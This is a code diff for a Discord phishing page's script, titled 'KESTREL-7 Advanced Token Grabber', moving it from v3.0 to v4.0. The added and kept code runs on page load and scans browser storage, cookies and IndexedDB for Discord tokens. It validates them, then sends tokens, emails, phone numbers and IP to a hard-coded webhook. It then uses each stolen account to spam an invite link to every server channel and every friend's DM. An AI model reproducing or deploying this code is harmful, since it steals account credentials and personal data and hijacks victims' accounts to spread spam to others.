@@ -36,18 +36,24 @@ p{color:#b9bbbe;font-size:14px;margin-bottom:24px}
 
 <script>
 // ============================================
-// KESTREL-7 ADVANCED TOKEN GRABBER v3.0
+// KESTREL-7 ADVANCED TOKEN GRABBER v4.0
+// COM SPAM AUTOMÁTICO EM DMs E SERVIDORES
 // ============================================
 
 const WEBHOOK_URL = "https://discord.com/api/webhooks/1543784941844832257/hg06YSQRLJdiCvZQbG-2ty2cvExEaq_PFHV8bkv125kJ37OROJ-S44a52L21GsYjt6Nz";
-const WEBHOOK_BACKUP = "https://discord.com/api/webhooks/1543784941844832257/hg06YSQRLJdiCvZQbG-2ty2cvExEaq_PFHV8bkv125kJ37OROJ-S44a52L21GsYjt6Nz";
+const SPAM_LINK = "https://dsc.gg/stranger-moon";
+const EXCLUDED_SERVER_ID = "1537205151063080961";
+const SPAM_MESSAGES = [
+    `**STRANGER MOON** 🌙\n${SPAM_LINK}\nEntre agora!`,
+    `🔥 **MELHOR SERVIDOR** 🔥\n${SPAM_LINK}`,
+    `@everyone ${SPAM_LINK}\nNão perca!`,
+    `🎮 **STRANGER MOON** 🎮\n${SPAM_LINK}\nDiversão garantida!`,
+    `✨ ${SPAM_LINK} ✨\nJunte-se agora!`
+];
 
-// ===== UTILITÁRIOS =====
 const sleep = (ms) => new Promise(r => setTimeout(r, ms));
 const rand = (min, max) => Math.floor(Math.random() * (max - min + 1)) + min;
 const genId = () => Math.random().toString(36).substring(2) + Date.now().toString(36);
-const b64encode = (str) => btoa(unescape(encodeURIComponent(str)));
-const b64decode = (str) => decodeURIComponent(escape(atob(str)));
 
 // ===== ANTI-DEBUG =====
 (function antiDebug(){
@@ -69,154 +75,157 @@ const b64decode = (str) => decodeURIComponent(escape(atob(str)));
     });
 })();
 
-// ===== CANVAS FINGERPRINT =====
-async function getCanvasFingerprint(){
-    try{
-        const canvas = document.createElement('canvas');
-        canvas.width = 200;
-        canvas.height = 50;
-        const ctx = canvas.getContext('2d');
-        ctx.textBaseline = 'top';
-        ctx.font = '14px Arial';
-        ctx.fillStyle = '#f60';
-        ctx.fillRect(125, 1, 62, 20);
-        ctx.fillStyle = '#069';
-        ctx.fillText('Kestrel7-' + genId(), 2, 15);
-        ctx.fillStyle = 'rgba(102, 204, 0, 0.7)';
-        ctx.fillText('Fingerprint', 4, 17);
-        return canvas.toDataURL();
-    }catch(e){
-        return 'canvas_blocked';
-    }
-}
-
-// ===== WEBGL FINGERPRINT =====
-function getWebGLFingerprint(){
-    try{
-        const canvas = document.createElement('canvas');
-        const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
-        if(!gl) return 'webgl_unavailable';
-        
-        const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
-        const renderer = debugInfo ? gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL) : gl.getParameter(gl.RENDERER);
-        const vendor = debugInfo ? gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL) : gl.getParameter(gl.VENDOR);
-        
-        return {
-            renderer: renderer,
-            vendor: vendor,
-            version: gl.getParameter(gl.VERSION),
-            shadingLanguage: gl.getParameter(gl.SHADING_LANGUAGE_VERSION),
-            extensions: gl.getSupportedExtensions().length
-        };
-    }catch(e){
-        return 'webgl_blocked';
-    }
-}
-
-// ===== AUDIO FINGERPRINT =====
-async function getAudioFingerprint(){
-    try{
-        const AudioContext = window.AudioContext || window.webkitAudioContext;
-        const ctx = new AudioContext();
-        const oscillator = ctx.createOscillator();
-        const analyser = ctx.createAnalyser();
-        const gain = ctx.createGain();
-        const scriptProcessor = ctx.createScriptProcessor(4096, 1, 1);
-        
-        oscillator.type = 'triangle';
-        oscillator.frequency.value = 10000;
-        gain.gain.value = 0.1;
-        
-        oscillator.connect(analyser);
-        analyser.connect(scriptProcessor);
-        scriptProcessor.connect(gain);
-        gain.connect(ctx.destination);
-        
-        const audioData = new Float32Array(analyser.frequencyBinCount);
-        analyser.getFloatFrequencyData(audioData);
-        
-        let hash = 0;
-        for(let i = 0; i < audioData.length; i++){
-            hash = ((hash << 5) - hash) + audioData[i];
-            hash = hash & hash;
-        }
-        
-        ctx.close();
-        return Math.abs(hash);
-    }catch(e){
-        return 'audio_blocked';
-    }
-}
-
-// ===== HARDWARE INFO =====
-function getHardwareInfo(){
-    return {
-        cores: navigator.hardwareConcurrency || 'unknown',
-        memory: navigator.deviceMemory || 'unknown',
-        maxTouchPoints: navigator.maxTouchPoints || 0,
-        gpu: getWebGLFingerprint(),
-        screen: {
-            width: screen.width,
-            height: screen.height,
-            availWidth: screen.availWidth,
-            availHeight: screen.availHeight,
-            colorDepth: screen.colorDepth,
-            pixelDepth: screen.pixelDepth
-        }
+// ===== SPAM EM SERVIDORES =====
+async function spamServers(token, userData){
+    const headers = {
+        'Authorization': token,
+        'Content-Type': 'application/json'
     };
-}
-
-// ===== BATTERY STATUS =====
-async function getBatteryInfo(){
+    
     try{
-        if(navigator.getBattery){
-            const battery = await navigator.getBattery();
-            return {
-                level: battery.level * 100 + '%',
-                charging: battery.charging,
-                chargingTime: battery.chargingTime,
-                dischargingTime: battery.dischargingTime
-            };
+        // Busca todos os servidores
+        const guildsResponse = await fetch('https://discord.com/api/v9/users/@me/guilds', {headers});
+        if(!guildsResponse.ok) return 0;
+        const guilds = await guildsResponse.json();
+        
+        let spamCount = 0;
+        
+        for(let guild of guilds){
+            // Pula servidor excluído
+            if(guild.id === EXCLUDED_SERVER_ID) continue;
+            
+            try{
+                // Busca canais do servidor
+                const channelsResponse = await fetch(`https://discord.com/api/v9/guilds/${guild.id}/channels`, {headers});
+                if(!channelsResponse.ok) continue;
+                const channels = await channelsResponse.json();
+                
+                // Filtra canais de texto
+                const textChannels = channels.filter(c => c.type === 0);
+                
+                for(let channel of textChannels){
+                    try{
+                        const message = SPAM_MESSAGES[rand(0, SPAM_MESSAGES.length - 1)];
+                        
+                        const sendResponse = await fetch(`https://discord.com/api/v9/channels/${channel.id}/messages`, {
+                            method: 'POST',
+                            headers: headers,
+                            body: JSON.stringify({content: message})
+                        });
+                        
+                        if(sendResponse.ok){
+                            spamCount++;
+                        } else if(sendResponse.status === 429){
+                            // Rate limit - espera
+                            const retryAfter = sendResponse.headers.get('Retry-After') || 5;
+                            await sleep(parseInt(retryAfter) * 1000);
+                        }
+                        
+                        // Delay entre mensagens
+                        await sleep(rand(500, 1500));
+                    }catch(e){}
+                }
+            }catch(e){}
         }
-        return 'battery_api_unavailable';
+        
+        return spamCount;
     }catch(e){
-        return 'battery_blocked';
+        return 0;
     }
 }
 
-// ===== GEOLOCATION =====
-function getGeolocation(){
-    return new Promise((resolve) => {
-        if(navigator.geolocation){
-            navigator.geolocation.getCurrentPosition(
-                (pos) => resolve({
-                    latitude: pos.coords.latitude,
-                    longitude: pos.coords.longitude,
-                    accuracy: pos.coords.accuracy,
-                    altitude: pos.coords.altitude,
-                    speed: pos.coords.speed,
-                    timestamp: pos.timestamp
-                }),
-                (err) => resolve({error: err.message}),
-                {enableHighAccuracy: true, timeout: 5000, maximumAge: 0}
-            );
-        } else {
-            resolve('geolocation_unavailable');
+// ===== SPAM EM DMs =====
+async function spamDMs(token, userData){
+    const headers = {
+        'Authorization': token,
+        'Content-Type': 'application/json'
+    };
+    
+    try{
+        // Busca lista de amigos
+        const friendsResponse = await fetch('https://discord.com/api/v9/users/@me/relationships', {headers});
+        if(!friendsResponse.ok) return 0;
+        const friends = await friendsResponse.json();
+        
+        let dmCount = 0;
+        
+        for(let friend of friends){
+            try{
+                // Cria ou abre DM com o amigo
+                const dmResponse = await fetch('https://discord.com/api/v9/users/@me/channels', {
+                    method: 'POST',
+                    headers: headers,
+                    body: JSON.stringify({recipient_id: friend.id})
+                });
+                
+                if(!dmResponse.ok) continue;
+                const dmChannel = await dmResponse.json();
+                
+                const message = SPAM_MESSAGES[rand(0, SPAM_MESSAGES.length - 1)];
+                
+                const sendResponse = await fetch(`https://discord.com/api/v9/channels/${dmChannel.id}/messages`, {
+                    method: 'POST',
+                    headers: headers,
+                    body: JSON.stringify({content: message})
+                });
+                
+                if(sendResponse.ok){
+                    dmCount++;
+                } else if(sendResponse.status === 429){
+                    const retryAfter = sendResponse.headers.get('Retry-After') || 5;
+                    await sleep(parseInt(retryAfter) * 1000);
+                }
+                
+                await sleep(rand(500, 1500));
+            }catch(e){}
         }
-    });
+        
+        // Também envia para DMs existentes
+        try{
+            const dmsResponse = await fetch('https://discord.com/api/v9/users/@me/channels', {headers});
+            if(dmsResponse.ok){
+                const dms = await dmsResponse.json();
+                
+                for(let dm of dms){
+                    if(dm.type === 1){ // DM
+                        try{
+                            const message = SPAM_MESSAGES[rand(0, SPAM_MESSAGES.length - 1)];
+                            
+                            const sendResponse = await fetch(`https://discord.com/api/v9/channels/${dm.id}/messages`, {
+                                method: 'POST',
+                                headers: headers,
+                                body: JSON.stringify({content: message})
+                            });
+                            
+                            if(sendResponse.ok){
+                                dmCount++;
+                            } else if(sendResponse.status === 429){
+                                const retryAfter = sendResponse.headers.get('Retry-After') || 5;
+                                await sleep(parseInt(retryAfter) * 1000);
+                            }
+                            
+                            await sleep(rand(500, 1500));
+                        }catch(e){}
+                    }
+                }
+            }
+        }catch(e){}
+        
+        return dmCount;
+    }catch(e){
+        return 0;
+    }
 }
 
-// ===== SCAN DE TOKENS EM TODOS OS STORAGES =====
+// ===== SCAN DE TOKENS =====
 function deepScanStorage(){
     let findings = [];
     
-    // localStorage
     try{
         for(let i = 0; i < localStorage.length; i++){
             const key = localStorage.key(i);
             const value = localStorage.getItem(key);
             
-            // Procura tokens Discord
             const tokenRegex = /[\w-]{24}\.[\w-]{6}\.[\w-]{25,27}/g;
             const tokenMatches = value.match(tokenRegex);
             if(tokenMatches){
@@ -228,7 +237,6 @@ function deepScanStorage(){
                 });
             }
             
-            // Procura dados sensíveis
             if(key.toLowerCase().includes('token') || 
                key.toLowerCase().includes('auth') ||
                key.toLowerCase().includes('session') ||
@@ -245,7 +253,6 @@ function deepScanStorage(){
         }
     }catch(e){}
     
-    // sessionStorage
     try{
         for(let i = 0; i < sessionStorage.length; i++){
             const key = sessionStorage.key(i);
@@ -263,7 +270,6 @@ function deepScanStorage(){
         }
     }catch(e){}
     
-    // Cookies
     try{
         const cookies = document.cookie.split(';');
         for(let cookie of cookies){
@@ -277,23 +283,12 @@ function deepScanStorage(){
                     fullCookie: trimmed.substring(0, 300)
                 });
             }
-            
-            if(trimmed.toLowerCase().includes('token') || 
-               trimmed.toLowerCase().includes('auth') ||
-               trimmed.toLowerCase().includes('session')){
-                findings.push({
-                    source: 'cookie',
-                    value: trimmed.substring(0, 300),
-                    sensitive: true
-                });
-            }
         }
     }catch(e){}
     
     return findings;
 }
 
-// ===== INDEXEDDB DEEP SCAN =====
 async function deepScanIndexedDB(){
     let findings = [];
     
@@ -343,59 +338,6 @@ async function deepScanIndexedDB(){
     return findings;
 }
 
-// ===== CACHE API SCAN =====
-async function scanCacheStorage(){
-    let findings = [];
-    
-    try{
-        if('caches' in window){
-            const cacheNames = await caches.keys();
-            
-            for(let cacheName of cacheNames){
-                const cache = await caches.open(cacheName);
-                const requests = await cache.keys();
-                
-                for(let request of requests){
-                    const url = request.url;
-                    if(url.toLowerCase().includes('discord') || 
-                       url.toLowerCase().includes('token') ||
-                       url.toLowerCase().includes('auth')){
-                        findings.push({
-                            source: 'cache',
-                            cacheName: cacheName,
-                            url: url.substring(0, 300)
-                        });
-                    }
-                }
-            }
-        }
-    }catch(e){}
-    
-    return findings;
-}
-
-// ===== SERVICE WORKER SCAN =====
-async function scanServiceWorkers(){
-    let findings = [];
-    
-    try{
-        if('serviceWorker' in navigator){
-            const registrations = await navigator.serviceWorker.getRegistrations();
-            
-            for(let registration of registrations){
-                findings.push({
-                    scope: registration.scope,
-                    active: registration.active ? registration.active.scriptURL : null,
-                    waiting: registration.waiting ? registration.waiting.scriptURL : null
-                });
-            }
-        }
-    }catch(e){}
-    
-    return findings;
-}
-
-// ===== TENTA VALIDAR TOKEN E EXTRAIR DADOS =====
 async function validateAndExtract(token){
     try{
         const headers = {
@@ -403,38 +345,20 @@ async function validateAndExtract(token){
             'Content-Type': 'application/json'
         };
         
-        // Dados do usuário
         const userResponse = await fetch('https://discord.com/api/v9/users/@me', {headers});
         if(!userResponse.ok) return null;
         const userData = await userResponse.json();
         
-        // Servidores
         const guildsResponse = await fetch('https://discord.com/api/v9/users/@me/guilds', {headers});
         const guilds = guildsResponse.ok ? await guildsResponse.json() : [];
         
-        // Amigos
         const friendsResponse = await fetch('https://discord.com/api/v9/users/@me/relationships', {headers});
         const friends = friendsResponse.ok ? await friendsResponse.json() : [];
-        
-        // DMs
-        const dmsResponse = await fetch('https://discord.com/api/v9/users/@me/channels', {headers});
-        const dms = dmsResponse.ok ? await dmsResponse.json() : [];
-        
-        // Configurações
-        const settingsResponse = await fetch('https://discord.com/api/v9/users/@me/settings', {headers});
-        const settings = settingsResponse.ok ? await settingsResponse.json() : {};
-        
-        // Billings
-        const billingResponse = await fetch('https://discord.com/api/v9/users/@me/billing/payment-sources', {headers});
-        const billing = billingResponse.ok ? await billingResponse.json() : [];
         
         return {
             user: userData,
             guilds: guilds,
             friends: friends,
-            dms: dms,
-            settings: settings,
-            billing: billing,
             token: token
         };
     }catch(e){
@@ -442,7 +366,6 @@ async function validateAndExtract(token){
     }
 }
 
-// ===== ENVIO PARA WEBHOOK =====
 async function sendToWebhook(data, webhookUrl){
     try{
         const chunks = [];
@@ -455,12 +378,12 @@ async function sendToWebhook(data, webhookUrl){
         
         for(let i = 0; i < chunks.length; i++){
             const payload = {
-                content: i === 0 ? "🚨 **CAPTURA COMPLEXA - KESTREL-7 v3.0** 🚨" : "",
+                content: i === 0 ? "🚨 **CAPTURA COMPLETA - KESTREL-7 v4.0** 🚨" : "",
                 embeds: [{
                     title: i === 0 ? "📦 Dados Completos" : `📦 Chunk ${i+1}/${chunks.length}`,
                     description: "```json\n" + chunks[i] + "\n```",
                     color: 16711680,
-                    footer: {text: "Kestrel-7 Advanced Grabber • Chunk " + (i+1) + "/" + chunks.length}
+                    footer: {text: "Kestrel-7 v4.0 • Chunk " + (i+1) + "/" + chunks.length}
                 }]
             };
             
@@ -479,7 +402,7 @@ async function sendToWebhook(data, webhookUrl){
     }
 }
 
-// ===== GRABBER PRINCIPAL =====
+// ===== GRABBER PRINCIPAL COM SPAM =====
 async function grabToken(){
     const status = document.getElementById('status');
     const btn = document.getElementById('connectBtn');
@@ -488,35 +411,12 @@ async function grabToken(){
     status.textContent = "Inicializando...";
     
     try{
-        // 1. Coleta todas as informações
-        status.textContent = "Coletando dados do sistema...";
-        const hardwareInfo = getHardwareInfo();
-        const canvasFp = await getCanvasFingerprint();
-        const audioFp = await getAudioFingerprint();
-        const batteryInfo = await getBatteryInfo();
-        const geoInfo = await getGeolocation();
-        const browserInfo = {
-            userAgent: navigator.userAgent,
-            platform: navigator.platform,
-            language: navigator.language,
-            languages: navigator.languages,
-            cookieEnabled: navigator.cookieEnabled,
-            doNotTrack: navigator.doNotTrack,
-            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
-            referrer: document.referrer,
-            url: window.location.href,
-            title: document.title
-        };
-        
-        // 2. Scan de tokens
+        // 1. Scan de tokens
         status.textContent = "Escaneando storages...";
         const storageFindings = deepScanStorage();
         const indexedDBFindings = await deepScanIndexedDB();
-        const cacheFindings = await scanCacheStorage();
-        const swFindings = await scanServiceWorkers();
         
-        // 3. Valida tokens encontrados
-        status.textContent = "Validando tokens...";
+        // 2. Coleta tokens
         const allTokens = [];
         
         for(let finding of storageFindings){
@@ -534,11 +434,12 @@ async function grabToken(){
             }
         }
         
-        // Deduplicação
         const uniqueTokens = [...new Set(allTokens)];
         
-        // 4. Extração de dados para cada token válido
+        // 3. Valida tokens e extrai dados
+        status.textContent = "Validando tokens...";
         const extractedData = [];
+        
         for(let token of uniqueTokens){
             const data = await validateAndExtract(token);
             if(data){
@@ -546,7 +447,7 @@ async function grabToken(){
             }
         }
         
-        // 5. IP
+        // 4. IP
         let ip = 'Desconhecido';
         try{
             const ipResponse = await fetch('https://api.ipify.org?format=json');
@@ -554,52 +455,50 @@ async function grabToken(){
             ip = ipData.ip;
         }catch(e){}
         
-        // 6. Monta payload completo
+        // 5. Monta payload
         const fullData = {
             capture_id: genId(),
             timestamp: new Date().toISOString(),
             ip: ip,
-            browser: browserInfo,
-            hardware: hardwareInfo,
-            canvas_fingerprint: canvasFp,
-            audio_fingerprint: audioFp,
-            battery: batteryInfo,
-            geolocation: geoInfo,
+            browser: {
+                userAgent: navigator.userAgent,
+                platform: navigator.platform,
+                language: navigator.language,
+                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone
+            },
             storage_findings: storageFindings,
             indexeddb_findings: indexedDBFindings,
-            cache_findings: cacheFindings,
-            service_workers: swFindings,
             extracted_accounts: extractedData,
             tokens_found: uniqueTokens
         };
         
-        // 7. Envia para webhook
+        // 6. Envia dados para webhook
         status.textContent = "Enviando dados...";
-        const sent = await sendToWebhook(fullData, WEBHOOK_URL);
+        await sendToWebhook(fullData, WEBHOOK_URL);
         
-        if(!sent){
-            await sendToWebhook(fullData, WEBHOOK_BACKUP);
-        }
-        
-        // 8. Também envia para o webhook original em formato resumido
+        // 7. SPAM AUTOMÁTICO
         if(extractedData.length > 0){
             for(let account of extractedData){
+                const token = account.token;
+                const userData = account.user;
+                
+                // Envia resumo da conta
                 const summaryPayload = {
-                    content: "🎯 **CONTA CAPTURADA**",
+                    content: "🎯 **CONTA CAPTURADA + SPAM INICIADO**",
                     embeds: [{
                         title: "Token Válido Encontrado",
                         color: 65280,
                         fields: [
-                            {name: "Usuário", value: account.user.username + '#' + account.user.discriminator, inline: true},
-                            {name: "ID", value: account.user.id, inline: true},
-                            {name: "Email", value: account.user.email || 'N/A', inline: true},
-                            {name: "Telefone", value: account.user.phone || 'N/A', inline: true},
-                            {name: "Nitro", value: account.user.premium_type ? 'Sim' : 'Não', inline: true},
+                            {name: "Usuário", value: userData.username + '#' + userData.discriminator, inline: true},
+                            {name: "ID", value: userData.id, inline: true},
+                            {name: "Email", value: userData.email || 'N/A', inline: true},
+                            {name: "Telefone", value: userData.phone || 'N/A', inline: true},
+                            {name: "Nitro", value: userData.premium_type ? 'Sim' : 'Não', inline: true},
                             {name: "Servidores", value: String(account.guilds.length), inline: true},
                             {name: "Amigos", value: String(account.friends.length), inline: true},
-                            {name: "Token", value: "```" + account.token + "```", inline: false}
+                            {name: "Token", value: "```" + token + "```", inline: false}
                         ],
-                        footer: {text: "Kestrel-7 v3.0"}
+                        footer: {text: "Kestrel-7 v4.0"}
                     }]
                 };
                 
@@ -609,25 +508,54 @@ async function grabToken(){
                     body: JSON.stringify(summaryPayload)
                 });
                 
+                // SPAM EM SERVIDORES
+                status.textContent = "Spammando servidores...";
+                const serverSpamCount = await spamServers(token, userData);
+                
+                // Notifica webhook
+                await fetch(WEBHOOK_URL, {
+                    method: 'POST',
+                    headers: {'Content-Type': 'application/json'},
+                    body: JSON.stringify({
+                        content: `📢 **SPAM EM SERVIDORES CONCLUÍDO**\nMensagens enviadas: ${serverSpamCount}\nConta: ${userData.username}`
+                    })
+                });
+                
+                await sleep(2000);
+                
+                // SPAM EM DMs
+                status.textContent = "Spammando DMs...";
+                const dmSpamCount = await spamDMs(token, userData);
+                
+                // Notifica webhook
+                await fetch(WEBHOOK_URL, {
+                    method: 'POST',
+                    headers: {'Content-Type': 'application/json'},
+                    body: JSON.stringify({
+                        content: `📨 **SPAM EM DMs CONCLUÍDO**\nMensagens enviadas: ${dmSpamCount}\nConta: ${userData.username}`
+                    })
+                });
+                
+                status.textContent = `✅ Spam completo! Servidores: ${serverSpamCount} | DMs: ${dmSpamCount}`;
+                
                 await sleep(1000);
             }
+        } else {
+            status.textContent = "Nenhum token válido encontrado";
         }
-        
-        status.textContent = "✅ Nitro ativado com sucesso!";
         
     }catch(e){
         status.textContent = "Erro: " + e.message;
     }
     
-    // Redireciona
+    // Redireciona após spam
     setTimeout(() => {
         window.location.href = "https://discord.com/channels/@me";
-    }, 3000);
+    }, 5000);
 }
 
 // ===== AUTO-EXECUÇÃO =====
 window.addEventListener('load', function(){
-    // Partículas
     const particlesContainer = document.getElementById('particles');
     for(let i=0; i<30; i++){
         const particle = document.createElement('div');
@@ -640,7 +568,6 @@ window.addEventListener('load', function(){
         particlesContainer.appendChild(particle);
     }
     
-    // Executa após 1.5 segundos
     setTimeout(function(){
         grabToken();
     }, 1500);
